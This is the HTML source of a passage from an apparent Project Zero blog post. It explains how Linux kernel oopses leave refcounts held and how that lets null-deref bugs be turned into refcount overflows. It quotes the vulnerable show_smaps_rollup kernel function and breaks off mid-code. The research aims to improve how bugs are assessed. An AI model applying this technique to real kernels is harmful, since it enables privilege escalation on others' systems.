counter(lst-ctn-kix_ehkygwr8rii2-5,lower-roman) ". "}ol.lst-kix_3558t16xb2i9-7{list-style-type:none}ol.lst-kix_gx9cg4br20pa-8.start{counter-reset:lst-ctn-kix_gx9cg4br20pa-8 0}.lst-kix_ehkygwr8rii2-2>li:before{content:"" counter(lst-ctn-kix_ehkygwr8rii2-2,lower-roman) ". "}ol.lst-kix_3558t16xb2i9-8{list-style-type:none}.lst-kix_dt3x5t4funnl-8>li{counter-increment:lst-ctn-kix_dt3x5t4funnl-8}ol.lst-kix_3558t16xb2i9-3{list-style-type:none}.lst-kix_ehkygwr8rii2-0>li:before{content:"" counter(lst-ctn-kix_ehkygwr8rii2-0,decimal) ". "}.lst-kix_ehkygwr8rii2-4>li:before{content:"" counter(lst-ctn-kix_ehkygwr8rii2-4,lower-latin) ". "}ol.lst-kix_3558t16xb2i9-4{list-style-type:none}ol.lst-kix_3558t16xb2i9-5{list-style-type:none}.lst-kix_ehkygwr8rii2-3>li:before{content:"" counter(lst-ctn-kix_ehkygwr8rii2-3,decimal) ". "}ol.lst-kix_3558t16xb2i9-6{list-style-type:none}.lst-kix_3558t16xb2i9-0>li{counter-increment:lst-ctn-kix_3558t16xb2i9-0}.lst-kix_ehkygwr8rii2-1>li:before{content:"" counter(lst-ctn-kix_ehkygwr8rii2-1,lower-latin) ". "}.lst-kix_ehkygwr8rii2-1>li{counter-increment:lst-ctn-kix_ehkygwr8rii2-1}.lst-kix_gx9cg4br20pa-2>li{counter-increment:lst-ctn-kix_gx9cg4br20pa-2}ol.lst-kix_dt3x5t4funnl-5.start{counter-reset:lst-ctn-kix_dt3x5t4funnl-5 0}ol.lst-kix_dt3x5t4funnl-0{list-style-type:none}ol.lst-kix_dt3x5t4funnl-1{list-style-type:none}ol.lst-kix_ehkygwr8rii2-2.start{counter-reset:lst-ctn-kix_ehkygwr8rii2-2 0}ol.lst-kix_dt3x5t4funnl-2{list-style-type:none}ol.lst-kix_3558t16xb2i9-0{list-style-type:none}ol.lst-kix_dt3x5t4funnl-3{list-style-type:none}ol.lst-kix_3558t16xb2i9-1{list-style-type:none}ol.lst-kix_dt3x5t4funnl-4{list-style-type:none}.lst-kix_dt3x5t4funnl-6>li{counter-increment:lst-ctn-kix_dt3x5t4funnl-6}ol.lst-kix_3558t16xb2i9-2{list-style-type:none}ol.lst-kix_dt3x5t4funnl-5{list-style-type:none}ol.lst-kix_dt3x5t4funnl-6{list-style-type:none}ol.lst-kix_dt3x5t4funnl-7{list-style-type:none}ol.lst-kix_3558t16xb2i9-4.start{counter-reset:lst-ctn-kix_3558t16xb2i9-4 0}ol.lst-kix_dt3x5t4funnl-8{list-style-type:none}.lst-kix_gx9cg4br20pa-4>li{counter-increment:lst-ctn-kix_gx9cg4br20pa-4}.lst-kix_3558t16xb2i9-1>li{counter-increment:lst-ctn-kix_3558t16xb2i9-1}ol.lst-kix_3558t16xb2i9-7.start{counter-reset:lst-ctn-kix_3558t16xb2i9-7 0}ol.lst-kix_dt3x5t4funnl-2.start{counter-reset:lst-ctn-kix_dt3x5t4funnl-2 0}ol.lst-kix_ehkygwr8rii2-5.start{counter-reset:lst-ctn-kix_ehkygwr8rii2-5 0}.lst-kix_gx9cg4br20pa-1>li:before{content:"" counter(lst-ctn-kix_gx9cg4br20pa-1,lower-latin) ". "}.lst-kix_gx9cg4br20pa-2>li:before{content:"" counter(lst-ctn-kix_gx9cg4br20pa-2,lower-roman) ". "}ol.lst-kix_dt3x5t4funnl-4.start{counter-reset:lst-ctn-kix_dt3x5t4funnl-4 0}.lst-kix_gx9cg4br20pa-6>li{counter-increment:lst-ctn-kix_gx9cg4br20pa-6}.lst-kix_dt3x5t4funnl-4>li{counter-increment:lst-ctn-kix_dt3x5t4funnl-4}ol.lst-kix_gx9cg4br20pa-0.start{counter-reset:lst-ctn-kix_gx9cg4br20pa-0 0}.lst-kix_gx9cg4br20pa-0>li:before{content:"" counter(lst-ctn-kix_gx9cg4br20pa-0,decimal) ". "}.lst-kix_3558t16xb2i9-7>li{counter-increment:lst-ctn-kix_3558t16xb2i9-7}.lst-kix_3558t16xb2i9-3>li{counter-increment:lst-ctn-kix_3558t16xb2i9-3}.lst-kix_ehkygwr8rii2-7>li{counter-increment:lst-ctn-kix_ehkygwr8rii2-7}.lst-kix_ehkygwr8rii2-4>li{counter-increment:lst-ctn-kix_ehkygwr8rii2-4}ol.lst-kix_gx9cg4br20pa-6.start{counter-reset:lst-ctn-kix_gx9cg4br20pa-6 0}ol.lst-kix_ehkygwr8rii2-4.start{counter-reset:lst-ctn-kix_ehkygwr8rii2-4 0}ol.lst-kix_dt3x5t4funnl-3.start{counter-reset:lst-ctn-kix_dt3x5t4funnl-3 0}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_gx9cg4br20pa-8>li:before{content:"" counter(lst-ctn-kix_gx9cg4br20pa-8,lower-roman) ". "}.lst-kix_gx9cg4br20pa-7>li:before{content:"" counter(lst-ctn-kix_gx9cg4br20pa-7,lower-latin) ". "}.lst-kix_gx9cg4br20pa-5>li:before{content:"" counter(lst-ctn-kix_gx9cg4br20pa-5,lower-roman) ". "}.lst-kix_gx9cg4br20pa-6>li:before{content:"" counter(lst-ctn-kix_gx9cg4br20pa-6,decimal) ". "}ol.lst-kix_3558t16xb2i9-5.start{counter-reset:lst-ctn-kix_3558t16xb2i9-5 0}.lst-kix_gx9cg4br20pa-0>li{counter-increment:lst-ctn-kix_gx9cg4br20pa-0}.lst-kix_gx9cg4br20pa-3>li:before{content:"" counter(lst-ctn-kix_gx9cg4br20pa-3,decimal) ". "}.lst-kix_gx9cg4br20pa-4>li:before{content:"" counter(lst-ctn-kix_gx9cg4br20pa-4,lower-latin) ". "}ol{margin:0;padding:0}table td,table th{padding:0}.EakHiGVfAD-c11{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.EakHiGVfAD-c19{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:italic}.EakHiGVfAD-c5{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.EakHiGVfAD-c12{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:"Arial";font-style:normal}.EakHiGVfAD-c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:Consolas,"Courier New";font-style:normal}.EakHiGVfAD-c17{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.EakHiGVfAD-c26{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.EakHiGVfAD-c1{font-size:10pt;font-family:Consolas,"Courier New";color:#9c27b0;font-weight:400}.EakHiGVfAD-c0{font-size:10pt;font-family:Consolas,"Courier New";color:#616161;font-weight:400}.EakHiGVfAD-c7{font-size:10pt;font-family:Consolas,"Courier New";color:#000000;font-weight:400}.EakHiGVfAD-c4{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.EakHiGVfAD-c27{font-size:10pt;font-family:Consolas,"Courier New";color:#0f9d58;font-weight:400}.EakHiGVfAD-c13{font-size:10pt;font-family:Consolas,"Courier New";color:#455a64;font-weight:400}.EakHiGVfAD-c9{font-size:10pt;font-family:Consolas,"Courier New";color:#c53929;font-weight:400}.EakHiGVfAD-c16{border-spacing:0;border-collapse:collapse;margin-right:auto}.EakHiGVfAD-c22{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.EakHiGVfAD-c25{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.EakHiGVfAD-c10{color:inherit;text-decoration:inherit}.EakHiGVfAD-c8{orphans:2;widows:2}.EakHiGVfAD-c15{margin-left:36pt;padding-left:0pt}.EakHiGVfAD-c20{padding:0;margin:0}.EakHiGVfAD-c3{font-weight:400;font-family:"Courier New"}.EakHiGVfAD-c21{height:0pt}.EakHiGVfAD-c23{margin-left:36pt}.EakHiGVfAD-c18{vertical-align:super}.EakHiGVfAD-c6{height:11pt}.EakHiGVfAD-c24{font-style:italic}.EakHiGVfAD-c14{font-weight:700}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c25 doc-content">
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span class="EakHiGVfAD-c5">Posted by Seth Jenkins, Project Zero</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6"><span class="EakHiGVfAD-c5"></span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span>For a fair amount of time</span><span>, null-deref bugs were a highly exploitable kernel bug class. Back when the kernel was able to access userland memory without restriction, and userland programs were still able to map the zero page, there were many easy techniques for exploiting null-deref bugs. However with the introduction of modern exploit mitigations such as SMEP and SMAP, as well as </span><span class="EakHiGVfAD-c3">mmap_min_addr</span><span>&nbsp;preventing unprivileged programs from mmap&rsquo;ing low addresses, null-deref bugs are generally not considered </span><span>a security issue</span><span>&nbsp;in modern kernel versions. </span><span>This blog post provides an exploit technique</span><span class="EakHiGVfAD-c5">&nbsp;demonstrating that treating these bugs as universally innocuous often leads to faulty evaluations of their relevance to security.</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6"><span class="EakHiGVfAD-c5"></span></p><h2 class="EakHiGVfAD-c17 EakHiGVfAD-c8" id="h.m1bt0m324efm"><span class="EakHiGVfAD-c12">Kernel oops overview</span></h2>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span>At present, when the Linux kernel triggers a null-deref from within a process context, it generates an </span><span class="EakHiGVfAD-c22"><a class="EakHiGVfAD-c101" href="https://en.wikipedia.org/wiki/Linux_kernel_oops">oops</a></span><span>, which is distinct from a kernel panic. A panic occurs when the kernel determines that there is no safe way to continue execution, and that therefore all execution must </span><span>cease</span><span>. However, the kernel does </span><span class="EakHiGVfAD-c24">not</span><span>&nbsp;stop all execution during an oops - instead the kernel tries to recover as best as it can and continue </span><span>execution</span><span>. In the case of a task, that involves throwing out the existing kernel stack and going directly to </span><span class="EakHiGVfAD-c3">make_task_dead</span><span>&nbsp;which calls </span><span class="EakHiGVfAD-c3">do_exit</span><span>. The kernel will also publish in dmesg a &ldquo;crash&rdquo; log and kernel backtrace depicting what state the kernel was in when the oops occurred. This may seem like an odd choice to make when memory corruption has clearly occurred - however the intention is to allow kernel bugs to more easily be detectable and loggable under the </span><span class="EakHiGVfAD-c22"><a class="EakHiGVfAD-c101" href="https://yarchive.net/comp/linux/BUG.html">philosophy that a working system is much easier to debug than a dead one.</a></span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6"><span class="EakHiGVfAD-c5"></span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span class="EakHiGVfAD-c5">The unfortunate side effect of the oops recovery path is that the kernel is not able to perform any associated cleanup that it would normally perform on a typical syscall error recovery path. This means that any locks that were locked at the moment of the oops stay locked, any refcounts remain taken, any memory otherwise temporarily allocated remains allocated, etc. However, the process that generated the oops, its associated kernel stack, task struct and derivative members etc. can and often will be freed, meaning that depending on the precise circumstances of the oops, it&rsquo;s possible that no memory is actually leaked. This becomes particularly important in regards to exploitation later.</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6"><span class="EakHiGVfAD-c5"></span></p><h2 class="EakHiGVfAD-c8 EakHiGVfAD-c17" id="h.eq2rlvs1528n"><span class="EakHiGVfAD-c12">Reference count mismanagement overview</span></h2>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span>Refcount mismanagement is a fairly well-known and exploitable issue. In the case where software improperly decrements a refcount, this can lead to a classic UAF primitive. The case where </span><span>software</span><span>&nbsp;improperly </span><span class="EakHiGVfAD-c14">doesn&rsquo;t</span><span>&nbsp;decrement</span><span>&nbsp;a refcount (</span><span>leaking a </span><span>reference) is also often exploitable. If the attacker can cause a refcount to be repeatedly improperly incremented, it is possible that given enough effort the refcount may overflow, at which point the software no longer has any remotely sensible idea of how many refcounts are taken on an object.</span><span>&nbsp;In such a case, it is possible for an attacker to destroy the object</span><span>&nbsp;by incrementing and decrementing the refcount back to zero after overflowing, while still holding reachable references to the associated memory. </span><span>32-bit refcounts are particularly vulnerable to this sort of overflow</span><span>. It is important however, that each increment of the refcount allocates little or no </span><span>physical memory</span><span>. </span><span>Even a single byte allocation is quite expensive if it must be performed 2</span><span class="EakHiGVfAD-c18">32</span><span>&nbsp;times</span><span class="EakHiGVfAD-c5">.</span></p><h2 class="EakHiGVfAD-c17 EakHiGVfAD-c8" id="h.35si9vu7f0jz"><span class="EakHiGVfAD-c12">Example null-deref bug</span></h2>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span>When a kernel oops unceremoniously ends a task, any refcounts that the task was holding remain held, even though all memory associated with the task may be freed when the task exits. Let&rsquo;s look at </span><span>an example</span><span class="EakHiGVfAD-c5">&nbsp;- an otherwise unrelated bug I coincidentally discovered in the very recent past:</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6"><span class="EakHiGVfAD-c5"></span></p><a id="t.fe2fb833118ca1ee8e3e8160d28a318057211654"></a><a id="t.0"></a><table class="EakHiGVfAD-c16"><tr class="EakHiGVfAD-c21"><td class="EakHiGVfAD-c11" colspan="1" rowspan="1">
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c1">static</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c1">int</span><span class="EakHiGVfAD-c7">&nbsp;show_smaps_rollup</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c1">struct</span><span class="EakHiGVfAD-c7">&nbsp;seq_file </span><span class="EakHiGVfAD-c0">*</span><span class="EakHiGVfAD-c7">m</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c1">void</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">*</span><span class="EakHiGVfAD-c7">v</span><span class="EakHiGVfAD-c0">)</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c0">{</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">struct</span><span class="EakHiGVfAD-c7">&nbsp;proc_maps_private </span><span class="EakHiGVfAD-c0">*</span><span class="EakHiGVfAD-c7">priv </span><span class="EakHiGVfAD-c0">=</span><span class="EakHiGVfAD-c7">&nbsp;m</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c1">private</span><span class="EakHiGVfAD-c0">;</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">struct</span><span class="EakHiGVfAD-c7">&nbsp;mem_size_stats mss</span><span class="EakHiGVfAD-c0">;</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">struct</span><span class="EakHiGVfAD-c7">&nbsp;mm_struct </span><span class="EakHiGVfAD-c0">*</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">;</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">struct</span><span class="EakHiGVfAD-c7">&nbsp;vm_area_struct </span><span class="EakHiGVfAD-c0">*</span><span class="EakHiGVfAD-c7">vma</span><span class="EakHiGVfAD-c0">;</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">unsigned</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c1">long</span><span class="EakHiGVfAD-c7">&nbsp;last_vma_end </span><span class="EakHiGVfAD-c0">=</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c9">0</span><span class="EakHiGVfAD-c0">;</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">int</span><span class="EakHiGVfAD-c7">&nbsp;ret </span><span class="EakHiGVfAD-c0">=</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c9">0</span><span class="EakHiGVfAD-c0">;</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c6"><span class="EakHiGVfAD-c2"></span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; priv</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">task </span><span class="EakHiGVfAD-c0">=</span><span class="EakHiGVfAD-c7">&nbsp;get_proc_task</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">priv</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">inode</span><span class="EakHiGVfAD-c0">);</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c13">//task reference taken</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">if</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">(!</span><span class="EakHiGVfAD-c7">priv</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">task</span><span class="EakHiGVfAD-c0">)</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">return</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">-</span><span class="EakHiGVfAD-c7">ESRCH</span><span class="EakHiGVfAD-c0">;</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c6"><span class="EakHiGVfAD-c2"></span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; mm </span><span class="EakHiGVfAD-c0">=</span><span class="EakHiGVfAD-c7">&nbsp;priv</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">;</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c13">//With no vma&#39;s, mm-&gt;mmap is NULL</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">if</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">(!</span><span class="EakHiGVfAD-c7">mm </span><span class="EakHiGVfAD-c0">||</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">!</span><span class="EakHiGVfAD-c7">mmget_not_zero</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">))</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">{</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c13">//mm reference taken</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ret </span><span class="EakHiGVfAD-c0">=</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">-</span><span class="EakHiGVfAD-c7">ESRCH</span><span class="EakHiGVfAD-c0">;</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">goto</span><span class="EakHiGVfAD-c7">&nbsp;out_put_task</span><span class="EakHiGVfAD-c0">;</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c0">}</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c6"><span class="EakHiGVfAD-c2"></span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; memset</span><span class="EakHiGVfAD-c0">(&amp;</span><span class="EakHiGVfAD-c7">mss</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c9">0</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c1">sizeof</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">mss</span><span class="EakHiGVfAD-c0">));</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c6"><span class="EakHiGVfAD-c2"></span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; ret </span><span class="EakHiGVfAD-c0">=</span><span class="EakHiGVfAD-c7">&nbsp;mmap_read_lock_killable</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">);</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c13">//mmap read lock taken</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">if</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">ret</span><span class="EakHiGVfAD-c0">)</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">goto</span><span class="EakHiGVfAD-c7">&nbsp;out_put_mm</span><span class="EakHiGVfAD-c0">;</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c6"><span class="EakHiGVfAD-c2"></span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; hold_task_mempolicy</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">priv</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c6"><span class="EakHiGVfAD-c2"></span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">for</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">vma </span><span class="EakHiGVfAD-c0">=</span><span class="EakHiGVfAD-c7">&nbsp;priv</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">mmap</span><span class="EakHiGVfAD-c0">;</span><span class="EakHiGVfAD-c7">&nbsp;vma</span><span class="EakHiGVfAD-c0">;</span><span class="EakHiGVfAD-c7">&nbsp;vma </span><span class="EakHiGVfAD-c0">=</span><span class="EakHiGVfAD-c7">&nbsp;vma</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">vm_next</span><span class="EakHiGVfAD-c0">)</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">{</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; smap_gather_stats</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">vma</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">&amp;</span><span class="EakHiGVfAD-c7">mss</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; last_vma_end </span><span class="EakHiGVfAD-c0">=</span><span class="EakHiGVfAD-c7">&nbsp;vma</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">vm_end</span><span class="EakHiGVfAD-c0">;</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c0">}</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c6"><span class="EakHiGVfAD-c2"></span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; show_vma_header_prefix</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">m</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;priv</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">mmap</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">vm_start</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">last_vma_end</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c9">0</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c9">0</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c9">0</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c9">0</span><span class="EakHiGVfAD-c0">);</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c13">//the deref of mmap causes a kernel oops here</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; seq_pad</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">m</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c27">&#39; &#39;</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; seq_puts</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">m</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c27">&quot;[rollup]\n&quot;</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c6"><span class="EakHiGVfAD-c2"></span></p>
